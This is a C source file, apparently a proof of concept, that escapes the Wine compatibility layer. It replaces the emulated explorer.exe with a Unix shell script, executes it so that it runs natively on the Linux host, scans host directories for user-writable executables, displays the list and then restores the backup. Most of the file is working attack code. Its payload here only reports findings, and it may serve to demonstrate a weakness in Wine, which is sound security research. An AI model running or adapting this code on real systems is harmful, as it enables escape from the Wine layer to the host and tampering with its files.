#include <windows.h>
#include <winbase.h>
#include <stdio.h>

#define BAK_SUBSTR ".bak"
#define BUF_LEN 2048
char GLOBAL_BUFFER[BUF_LEN];
char filename[] = "explorer.exe";
char *penfile;
char *penfilebak;

char scriptText[] = "#!/bin/sh\n"
					"CURR_DIR=$(echo ${0} | sed -r \"s/\\/[a-zA-Z]:\\/.+//\")\n"
					"cd ${CURR_DIR}\n"
					"wvf=\"/tmp/wvf.txt\"\n"					
					"W_D_EXPR=$(echo ${CURR_DIR} | sed \"s/\\/dosdevices$//\" | sed \"s/\\//\\\\\\\\\\//g\")\n"
					"DIRS4FIND=$(ls -la | tail -n +4 | grep -v '/dev/' | sed -r \"s/^[^>]+> //\" | sed \"s/^\\.\\./${W_D_EXPR}/g\" | sort -u |  sed \"s/$/;/\" | tr -d '\n')\n"
					"IFS=';'\n"
					"for i in ${DIRS4FIND}; do\n"
					  "if [ \"${i}\" = \"/\" ]; then\n"
					    "ROOT_DIR=${i}\n"					  
					  "fi\n"
					"done\n"					
					"truncate --size 0 ${wvf}\n"
					"if [ \"${ROOT_DIR}\" = \"/\" ]; then\n"
					  "find $ROOT_DIR -user $USER -type f -perm /a=x -perm /a=w -perm /a=r -print 2>/dev/null >> ${wvf}\n"
					"else\n"
					  "for i in ${DIRS4FIND}; do\n"
						"find ${i} -user $USER -type f -perm /a=x -perm /a=w -perm /a=r -print 2>/dev/null >> ${wvf}\n"
					  "done\n"
					"fi\n"
					"sed \"s/^/'/g\" -i ${wvf}\n"
					"sed \"s/$/'/g\" -i ${wvf}\n"
					"QUANTITY=$(wc -l ${wvf} | awk '{print $1}')\n"
					"sed \"1iWine has access to ${QUANTITY} potentially vulnerable files:\" -i ${wvf}\n"
					"xterm -hold -e sh -c \"less ${wvf}\"\n"
					//"rm ${wvf}\n"
					"BAK=\"${0}"BAK_SUBSTR"\"\n"
					"sh -c \"cat ${BAK} > ${0}; rm ${BAK}\"&\n";
					
void filecopy(char *, char *);
void codeWrite(char *, char *);

main(int argc, char *argv[])
{
	size_t len;

	len = GetWindowsDirectoryA(GLOBAL_BUFFER,BUF_LEN);
	
	penfile = GlobalAlloc(GMEM_FIXED, (strlen(GLOBAL_BUFFER)+strlen(filename)+1 ));
	len = sprintf(penfile, "%s\\%s", GLOBAL_BUFFER, filename);	

	penfilebak = GlobalAlloc(GMEM_FIXED,(len+=5));
	len =sprintf(penfilebak, "%s%s", penfile, BAK_SUBSTR);

	filecopy(penfile, penfilebak);
	 
	 
	codeWrite(penfile, scriptText);

	STARTUPINFOA cif;
	ZeroMemory(&cif,sizeof(STARTUPINFOW));
	PROCESS_INFORMATION pi;
	CreateProcessA(NULL, penfile, NULL, NULL, FALSE, 0, NULL, NULL, &cif, &pi);
	
	GlobalFree(penfile);
	GlobalFree(penfilebak);
	return 0;
}

void filecopy(char *infile, char *outfile)
{
	HANDLE hFileIN, hFileOUT;
	hFileIN  = CreateFileA(infile ,  GENERIC_READ ,  0,  NULL,  OPEN_EXISTING,  FILE_ATTRIBUTE_NORMAL,  NULL);
	if(hFileIN != INVALID_HANDLE_VALUE)
	{
		hFileOUT = CreateFileA(outfile,  GENERIC_WRITE,  0,  NULL,  CREATE_ALWAYS,  FILE_ATTRIBUTE_NORMAL,  NULL);
		if(hFileOUT != INVALID_HANDLE_VALUE)
		{
			DWORD len;		
			while(ReadFile(hFileIN , GLOBAL_BUFFER,  BUF_LEN,  &len,  NULL))
			{
				if(!len)
					break;
				WriteFile(hFileOUT, GLOBAL_BUFFER,  len,  &len,  NULL);
			}
			CloseHandle(hFileIN);
		}
		CloseHandle(hFileOUT);
	}
}

void codeWrite(char *file, char *script)
{
	DWORD script_len, len;
	HANDLE *outfile = CreateFileA(file,  GENERIC_WRITE,  0,  NULL,  CREATE_ALWAYS,  FILE_ATTRIBUTE_NORMAL,  NULL);
	script_len = lstrlen(script);
	if(outfile != INVALID_HANDLE_VALUE)
	{
		WriteFile(outfile,  script,  script_len,  &len,  NULL);
		CloseHandle(outfile);
	}
	else
	{
			exit(1);
	}
}
